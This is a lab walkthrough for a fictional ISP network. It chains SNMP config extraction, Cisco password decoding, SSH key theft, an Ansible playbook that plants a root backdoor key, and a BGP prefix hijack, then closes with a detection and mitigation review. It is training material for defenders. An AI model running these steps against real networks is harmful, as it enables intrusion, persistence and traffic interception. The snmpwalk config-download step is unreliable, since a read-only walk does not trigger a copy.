# Operation Toadstool Takeover

Welcome, aspiring digital miscreant, to the whimsical yet vulnerable world of [FungusFiber Internet](entity.md), [Fungolia](https://broomstick.tymyrddin.dev/posts/fungolia/)’s premier (and only) provider of mycelium-net-based broadband. Your mission, should you choose to accept it, is to infiltrate their chaotically charming network. You will chain together a series of exploits, from lowly default passwords to the majestic manipulation of internet routing itself.

Remember: this is a pantomime. The crown jewels are made of plastic, the customers are all actors, and the entire performance is on a closed stage. Your goal is to learn the script of a sophisticated adversary so you can eventually direct the defence.

## Stage 1: The Spore Scan - Reconnaissance

Goal: To map the digital terrain of FungusFiber and identify every unlocked door and open window.

Your Actions:

1.  The Broad Sweep: Use a tool like `nmap` to perform a silent sweep of the lab's "public" IP range.
    *   Command: `nmap -sS -T4 -Pn 10.0.0.0/24 -oG initial_scan.gnmap`
    *   Look For: Devices with a surprising number of open ports. A printer should not be listening on 50 different services.

2.  Service Interrogation: Interrogate any discovered services to find out what they are and what version they are running.
    *   Command: `nmap -sV -sC -O -p <open_ports> <target_ip>`
    *   Finding: Note any amusingly outdated software. Is the router really running `OpenSSH 4.3` from 2006? Jot it down.

3.  The Search for Secrets: Probe for common information leaks.
    *   Command: `snmp-check <target_ip> -c public`
    *   Finding: The SNMP service on the core router is using the read-write community string `fungus`. This is your first key.

Adversary Mindset: You are a digital truffle pig, sniffing for the valuable, hidden flaws everyone else overlooks. Patience is a virtue; a full scan is less suspicious than a frantic, noisy one.

## Stage 2: The Mycelial Foothold - Initial Access

Goal: To transition from an outside observer to an inside user with a command prompt.

Your Actions:

1.  SNMP Exploitation: Use the discovered community string to extract the router's configuration file.
    *   Command: `snmpwalk -v2c -c fungus <router_ip> .1.3.6.1.4.1.9.9.96.1.1.1.1.2` (This is a common OID for triggering config downloads on older Cisco devices in labs).
    *   Finding: The command forces the router to TFTP its config to your machine. You now have the file `router-config.cfg`.

2.  Crack the Code: Open the configuration file. Search for lines containing the word "password". You will find an entry: `enable password 7 0822455D0A165B1E1F`.
    *   Command: `cat router-config.cfg | grep -i password`
    *   Action: Use a Cisco password decoder (like `cisco-decrypt.py`) on the hash.
    *   Finding: The password decrypts to `FungusFan99!`.

3.  Establish Access: Use the decrypted password to log into the router via SSH.
    *   Command: `ssh admin@<router_ip>`
    *   Password: `FungusFan99!`
    *   Verification: Your command prompt changes to `FungusFiber-Core-Router#`.

Adversary Mindset: Defaults and weak encryption are the gifts that keep on giving. Never assume a password is truly hidden.

## Stage 3: Becoming the Mycelium - Privilege Escalation & Pivot

Goal: To move from controlling one router to understanding and controlling the entire network core.

Your Actions:

1.  Network Topology Discovery: From your new privileged position, map the entire internal network.
    *   Command: `show ip route` (to see all known networks)
    *   Command: `show cdp neighbors` (to find directly connected network devices)
    *   Finding: You discover a server on the internal management network: `192.168.5.10`.

2.  The Pivot Point: You notice the router has an SSH key configured for automated backups to that server.
    *   Command: `show run | include ssh`
    *   Finding: A line shows: `ip ssh pubkey-chain / username backup-user / key-hash ssh-rsa 0A1B2C3D4E5F...`.

3.  Key Theft: Extract the private key corresponding to this public key from the router's filesystem (simulated in the lab by a file placed in `/tmp/`).
    *   Command: `more /tmp/backup-key.priv`
    *   Action: Copy this key to your attacker machine.

Adversary Mindset: Lateral movement is often about abusing trusted relationships set up for convenience. Automation scripts and backup systems are a golden ticket.

## Stage 4: Sporing the Core - Lateral Movement

Goal: Use your stolen credentials to infiltrate the management server.

Your Actions:

1.  Access the Server: Use the stolen SSH key to access the management server.
    *   Command: `ssh -i backup-key.priv backup-user@192.168.5.10`
    *   Verification: You are in. Your prompt is now `backup-user@mgmt-server:~$`.

2.  Explore Your New Kingdom: Check what privileges this user has.
    *   Command: `sudo -l`
    *   Finding: The user can run `/usr/bin/ansible-playbook` as root without a password to run playbooks from `/opt/automation/`.

Adversary Mindset: Always check `sudo -l`. It is the single most common command that leads to privilege escalation on Linux systems.

## Stage 5: The Grand Fruiting Body - Privilege Escalation

Goal: To achieve total control by becoming the root user on the management server.

Your Actions:

1.  Weaponise Ansible: You can run Ansible playbooks as root. Create a malicious playbook that adds your public SSH key to the root user's `authorized_keys` file.
    *   Create a file called `pwn.yml` in `/tmp/`:
        ```yaml
        - hosts: localhost
          become: yes
          tasks:
            - name: Install backdoor key
              ansible.builtin.lineinfile:
                path: /root/.ssh/authorized_keys
                line: "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali"
                create: yes
                mode: '0600'
        ```
    *   Run the playbook as root:
        *   Command: `sudo /usr/bin/ansible-playbook /tmp/pwn.yml`

2.  Claim Your Prize: SSH into the management server as the root user.
    *   Command: `ssh -i id_rsa root@192.168.5.10`
    *   Verification: Your prompt is now `root@mgmt-server:~#`. You own the core management server.

Adversary Mindset: Abusing legitimate system administration tools is the ultimate stealth technique. It blends in perfectly with normal activity.

## Stage 6: Becoming the Network - Persistence & BGP Manipulation

Goal: To embed yourself deeply and manipulate the very fabric of FungusFiber's internet.

Your Actions:

1.  Establish Persistence: Add your SSH key to the `authorized_keys` file of the core router's admin user as well.
2.  BGP Hijacking (Lab Edition): From the router, announce a fictitious network to the rest of the lab.
    *   Command on Router:
        ```bash
        configure terminal
        router bgp 65001
        network 198.51.100.0 mask 255.255.255.0
        end
        ```
    *   Impact: You have now falsely told the entire lab network that you are the legitimate path for this block of IP addresses. Any traffic destined for them will be routed to you.

3.  Capture the Traffic: On your attacker machine, use `tcpdump` to watch the traffic for this fake network flow in.
    *   Command: `sudo tcpdump -nni eth0 net 198.51.100.0/24`
    *   Observation: You will see lab test traffic (pings, scans) arriving at your interface.

Adversary Mindset: Persistence is not just about access; it is about power. Controlling routing is the ultimate power in an ISP.

## The Aftermath: Switching Hats

Your role as the adversary is now complete. Switch your hat from black to white.

*   Review: Where should FungusFiber have detected you? (SNMP authentication logs, failed login alerts, unauthorised config changes, anomalous BGP advertisements).
*   Mitigate: How could each step have been prevented?
    *   Stage 1: Filter SNMP at the perimeter; use complex community strings.
    *   Stage 2: Use SNMPv3 with encryption; never use weak password encryption.
    *   Stage 3 & 4: Protect SSH keys; implement network segmentation; follow the principle of least privilege with `sudo`.
    *   Stage 6: Implement BGP Origin Validation (RPKI) and filter prefixes.

You have now walked in the footsteps of an advanced adversary. Use this knowledge to build stronger defences. The internet's fungi depend on it